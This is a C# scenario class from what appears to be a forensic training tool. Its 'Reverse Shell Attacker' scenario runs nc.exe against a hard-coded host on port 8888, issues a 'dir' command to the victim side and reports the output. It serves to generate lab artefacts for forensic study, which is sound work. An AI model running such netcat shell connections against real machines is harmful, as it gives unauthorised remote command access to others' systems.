using System;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Threading.Tasks;
using Caliburn.Micro;
using ForensicScenarios.Tools;
using ForensicScenarios.Events;

namespace ForensicScenarios.Scenarios
{
    public class ReverseShell : PropertyChangedBase, IScenario
    {
        public string Name => "Reverse Shell Attacker";

        public string Description { get; set; }

        public bool IsSelected
        {
            get => isSelected;
            set
            {
                isSelected = value;
                NotifyOfPropertyChange(nameof(IsSelected));
            }
        }

        private bool isSelected;

        private readonly IEventAggregator eventAggregator;

        public ReverseShell(IEventAggregator aggregator)
        {
            eventAggregator = aggregator;
            Description = "A reverse shell is a post-exploitation technique used to achieve persistency in the exploitation, and to execute commands on a victim's computer.The attacker makes the victim computer link a command shell to messages received on a listening port, and then wait for a connection from the attacker. Any commands received are executed with the permissions of the shell.\n\nRunning this scenario will cause a connection to be made back to the victim machine on port 8888. Commands will then be issued causing the victim to transfer files to the attacking machine. Running this scenario requires the \"Reverse Shell Victim\" scenario to be running on another machine.";
        }

        public async void Run()
        {
            var path = Directory.GetCurrentDirectory() + @"\Scripts\Attacker\nc.exe 10.201.0.42 8888";
            var prc = ProcessService.CreateCmdProcess(path, false, redirectInput: true, redirectOutput: true);

            prc.Start();

            await Wait.ForTimeAsync(TimeSpan.FromSeconds(3));
            prc.StandardInput.WriteLine("dir");
            await Wait.ForTimeAsync(TimeSpan.FromSeconds(3));

            if (!prc.HasExited)
                prc.Kill();

            var contents = prc.StandardOutput.ReadToEnd();

            eventAggregator.SendStatusInfo(this, contents);
            eventAggregator.SendStatusInfo(this, "Reverse shell successful...✔");
            eventAggregator.BeginPublishOnUIThread(new ScenarioCompleted(this));
        }
    }
}
